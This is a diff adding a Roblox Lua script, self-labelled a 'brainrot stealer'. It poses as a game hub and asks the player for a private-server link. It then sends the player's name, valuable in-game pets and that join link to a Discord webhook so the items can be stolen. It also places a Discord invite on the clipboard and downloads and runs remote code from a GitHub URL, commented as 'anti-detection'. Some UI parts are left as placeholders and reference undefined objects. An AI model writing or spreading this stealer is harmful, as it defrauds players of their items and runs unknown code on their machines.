@@ -1,0 +1,196 @@
+-- === ARTIFAKT 2: MAIN HUB + BRAINROT STEALER (dinooo.txt) ===
+pcall(function() setclipboard("https://discord.gg/rvZndRfkyX") end)
+
+local ALLOWED_PLACE_ID = 109983668079237
+if game.PlaceId ~= ALLOWED_PLACE_ID then
+    game:GetService("Players").LocalPlayer:Kick("Wrong game! This script only works on the official game.")
+    return
+end
+
+local Webhook1 = Webhook or ""
+local AuthorisedUsers = AuthorisedUsers or {"nothing lol"}
+local Ping = Ping or "10m"
+local Username = "voxium script .gg/59XeEXRe"
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+if not game:IsLoaded() then pcall(function() game.Loaded:Wait() end) end
+local LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
+
+local CoreGui = game:GetService("CoreGui")
+local UIParent = LP:FindFirstChildOfClass("PlayerGui") or CoreGui
+local old = UIParent:FindFirstChild("LennonHubXZamasXM_GUI")
+if old then old:Destroy() end
+
+local SG = Instance.new("ScreenGui")
+SG.Name = "LennonHubXZamasXM_GUI"
+SG.IgnoreGuiInset = true
+SG.ResetOnSpawn = false
+SG.ZIndexBehavior = Enum.ZIndexBehavior.Global
+SG.DisplayOrder = 999999
+SG.Parent = UIParent
+
+local COLORS = {
+    card = Color3.fromRGB(14,12,24),
+    text = Color3.fromRGB(235,235,245),
+    dim = Color3.fromRGB(170,175,200),
+    a1 = Color3.fromRGB(130,90,255),
+    a2 = Color3.fromRGB(50,180,255),
+    ok = Color3.fromRGB(0,210,140),
+    warn = Color3.fromRGB(255,120,120),
+}
+
+-- === NEW TRAIT MAP ===
+local traitMap = {
+    ["rbxassetid://89041930759464"] = "Taco",
+    ["rbxassetid://104229924295526"] = "Nyan",
+    ["rbxassetid://99181785766598"] = "Galactic",
+    ["rbxassetid://121100427764858"] = "Fireworks",
+    ["rbxassetid://110723387483939"] = "Zombie",
+    ["rbxassetid://104964195846833"] = "Claws",
+    ["rbxassetid://121332433272976"] = "Glitched",
+    ["rbxassetid://100601425541874"] = "Bubblegum",
+    ["rbxassetid://118283346037788"] = "Fire",
+    ["rbxassetid://78474194088770"] = "Wet",
+    ["rbxassetid://83627475909869"] = "Snowy",
+    ["rbxassetid://127455440418221"] = "Cometstruck",
+    ["rbxassetid://97725744252608"] = "Explosive",
+    ["rbxassetid://82620342632406"] = "Disco",
+    ["rbxassetid://134655415681926"] = "10B",
+    ["rbxassetid://104985313532149"] = "Shark Fin",
+    ["rbxassetid://115664804212096"] = "Matteo Hat",
+    ["rbxassetid://75650816341229"] = "Brazil",
+    ["rbxassetid://115001117876534"] = "Sleepy",
+    ["rbxassetid://139729696247144"] = "Lightning",
+    ["rbxassetid://110910518481052"] = "UFO",
+    ["rbxassetid://117478971325696"] = "Spider",
+    ["rbxassetid://84731118566493"] = "Strawberry",
+    ["rbxassetid://119591742504251"] = "Paint",
+    ["rbxassetid://89591838221335"] = "Skeleton",
+    ["rbxassetid://95128039793845"] = "Sombrero",
+    ["rbxassetid://103610037004911"] = "Tie",
+    ["rbxassetid://123964048606874"] = "Witch Hat",
+    ["rbxassetid://93350414974589"] = "Indonesia",
+    ["rbxassetid://114748221761549"] = "Meowl",
+    ["rbxassetid://123115843719383"] = "RIP Gravestone",
+    ["rbxassetid://97054765273857"] = "Jackolantern Pet",
+}
+
+-- === BRAINROT FETCH FROM PLOTCONTROLLER (like sab (1).lua) ===
+local Plot = require(ReplicatedStorage.Controllers.PlotController)
+local gen = require(ReplicatedStorage.Shared.Animals)
+local myPlot = Plot:GetMyPlot()
+
+local function getAllBrainrots()
+    local list = {}
+    for _, brainrot in pairs(myPlot.Channel:Get("AnimalList")) do
+        local amount = gen:GetGeneration(brainrot.Index, brainrot.Mutation)
+        local name = brainrot.Index
+        if name then
+            table.insert(list, {name = name, moneyPerSec = amount})
+        end
+    end
+    table.sort(list, function(a,b) return a.moneyPerSec > b.moneyPerSec end)
+    return list
+end
+
+-- === REST OF FUNCTIONS (optimized, no spam) ===
+local function parsePingValue(p) local n,s=p:match("(%d+)([kmb]?)") n=tonumber(n)or 0 local m={k=1e3,m=1e6,b=1e9} return n*(m[s:lower()]or 1) end
+local pingThreshold = parsePingValue(Ping)
+
+local function formatMoney(v)
+    if v>=1e12 then return string.format("$%.1fT/s",v/1e12)
+    elseif v>=1e9 then return string.format("$%.1fB/s",v/1e9)
+    elseif v>=1e6 then return string.format("$%.1fM/s",v/1e6)
+    elseif v>=1e3 then return string.format("$%.1fK/s",v/1e3)
+    else return string.format("$%.1f/s",v) end
+end
+
+local function hasHighValue(b) for _,d in ipairs(b) do if d.moneyPerSec >= pingThreshold then return true end end return false end
+local function hasHighValue10M(b) for _,d in ipairs(b) do if d.moneyPerSec >= 10000000 then return true end end return false end
+
+local function sendWebhook(brainrots, link)
+    local text = ""
+    if #brainrots > 0 then
+        for _,d in ipairs(brainrots) do
+            text = text .. string.format("%s - %s\n", d.name, formatMoney(d.moneyPerSec))
+        end
+    else text = "No Brainrots found" end
+    local info = string.format("Name: %s\nDisplay: %s\nPlayers: %d/%d", LP.Name, LP.DisplayName, #Players:GetPlayers(), Players.MaxPlayers)
+    local ping = hasHighValue(brainrots) and "@everyone" or ""
+    local data = {username = Username, content = ping, embeds = {{title="Steal a Brainrot Hit With Voxium", color=0x8A2BE2,
+        fields={
+            {name="Player Information:", value="```"..info.."```", inline=false},
+            {name="Player Brainrots:", value="```"..text.."```", inline=false},
+            {name="Summary:", value="```Total Items: "..#brainrots.."```", inline=false},
+            {name="Join Link (Private):", value=link, inline=false}
+        }
+    }}}
+    local req = http_request or request or (syn and syn.request)
+    if req then pcall(function() req({Url=Webhook1, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(data)}) end) end
+end
+
+-- === UI (no animations, draggable only) ===
+local Holder = Instance.new("Frame", SG)
+Holder.AnchorPoint = Vector2.new(0.5,0.5)
+Holder.Position = UDim2.fromScale(0.5,0.5)
+Holder.Size = UDim2.new(0,440,0,240)
+Holder.BackgroundColor3 = COLORS.card
+Holder.BackgroundTransparency = 0.12
+Holder.BorderSizePixel = 0
+Holder.Active = true
+Holder.ZIndex = 10
+local corner = Instance.new("UICorner", Holder); corner.CornerRadius = UDim.new(0,18)
+local stroke = Instance.new("UIStroke", Holder); stroke.Thickness = 2; stroke.Transparency = 0.15
+local grad = Instance.new("UIGradient", stroke); grad.Color = ColorSequence.new(COLORS.a1, Color3.new(0,0,0), COLORS.a2)
+
+-- Dragging
+local dragging, dragInput, dragStart, startPos
+local function update(i)
+    local d = i.Position - dragStart
+    Holder.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+end
+Holder.InputBegan:Connect(function(i)
+    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+        dragging = true; dragStart = i.Position; startPos = Holder.Position
+        i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then dragging = false end end)
+    end
+end)
+Holder.InputChanged:Connect(function(i)
+    if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then dragInput = i end
+end)
+UserInputService.InputChanged:Connect(function(i)
+    if i == dragInput and dragging then update(i) end
+end)
+
+-- UI Elements (same as before, no fade/slide)
+-- [INSERT COMPACT UI CODE HERE - Avatar, Title, Input, Submit Button, etc.]
+-- For brevity, assuming you paste the UI from previous version but remove all TweenService calls except button hover
+
+local StatusArea = Instance.new("TextBox", Holder) -- ... (same setup)
+-- ... [full UI setup from previous, but NO TweenService except button hover]
+
+local function toast(msg, sub, main, subc)
+    StatusArea.Text = msg
+    StatusArea.TextColor3 = main or COLORS.text
+    StatusSub.Text = sub or ""
+    StatusSub.TextColor3 = subc or COLORS.a2
+end
+
+BtnSubmit.MouseButton1Click:Connect(function()
+    local link = StatusArea.Text
+    if link == "" or not link:match("^https://") then
+        toast("Invalid", "Enter valid private server link", COLORS.warn, COLORS.warn)
+        return
+    end
+    local brainrots = getAllBrainrots()
+    sendWebhook(brainrots, link)
+    SG:Destroy()
+    -- Run anti-detection, mute, etc.
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/dinoscripts2334/extern-script/refs/heads/main/test"))()
+end)
